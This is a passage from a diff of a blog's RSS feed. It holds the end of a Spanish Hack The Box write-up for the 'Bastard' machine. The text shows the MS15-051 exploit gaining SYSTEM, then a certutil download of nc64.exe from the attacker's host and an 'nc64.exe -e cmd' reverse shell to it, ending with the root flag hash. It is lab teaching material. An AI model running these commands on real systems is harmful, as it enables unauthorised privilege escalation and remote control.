-[#] ms15-051 fixed by zcgonvh
-[!] process with pid: 1760 created.
-==============================
-nt authority\system
-PS C:\WIndows\Temp\Priv&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Seguidamente para ganar acceso como &lt;code&gt;administrator&lt;/code&gt;, descargaremos &lt;code&gt;ncat&lt;/code&gt; versión &lt;code&gt;1.12&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una vez lo tengamos, proceremos a subir &lt;code&gt;nc64.exe&lt;/code&gt; a la maquina victima.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/nc64.exe nc64.exe
-****  Online  ****
-  0000  ...
-  b0d8
-CertUtil: -URLCache command completed successfully.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el &lt;code&gt;exploit&lt;/code&gt; y asi obtener una consola interactiva.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;    Directory: C:\Windows\Temp\Priv
-
-
-Mode                LastWriteTime     Length Name                              
-----                -------------     ------ ----                              
--a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe                   
--a---         29/4/2023   7:15 ??      45272 nc64.exe                          
-
-
-.\ms15-051x64.exe &quot;C:\Windows\Temp\Priv\nc64.exe -e cmd 10.10.16.3 443&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos y recibimos la conexión como &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.9.
-Ncat: Connection from 10.10.10.9:49361.
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-whoami
-whoami
-nt authority\system
-
-C:\Windows\Temp\Priv&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finalmente nos dirigimos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😏.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
- Volume in drive C has no label.
- Volume Serial Number is C4CD-C60B
-
- Directory of C:\Users\Administrator\Desktop
-
-08/02/2022  05:50     &amp;lt;DIR&amp;gt;          .
-08/02/2022  05:50     &amp;lt;DIR&amp;gt;          ..
-19/03/2017  08:34                 32 root.txt
-               1 File(s)             32 bytes
-               2 Dir(s)   4.134.981.632 bytes free
-
-type root.txt
-type root.txt
-4bf12b963da1b30cc93496f617f7ba7c
-&lt;/code&gt;&lt;/pre&gt;
-</description>
-        <pubDate>Fri, 28 Apr 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Bastard</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Bastard</guid>
-        
-        <category>Drupal Enumeration</category>
-        
-        <category>Drupal sql RCE</category>
-        
-        <category>Drupalgeddon2</category>
-        
-        <category>Drupalgeddon3</category>
-        
-        <category>Remote Code Execution Drupal</category>
-        
-        <category>Sherlock Enumeration</category>
         
         
         <category>hackthebox</category>
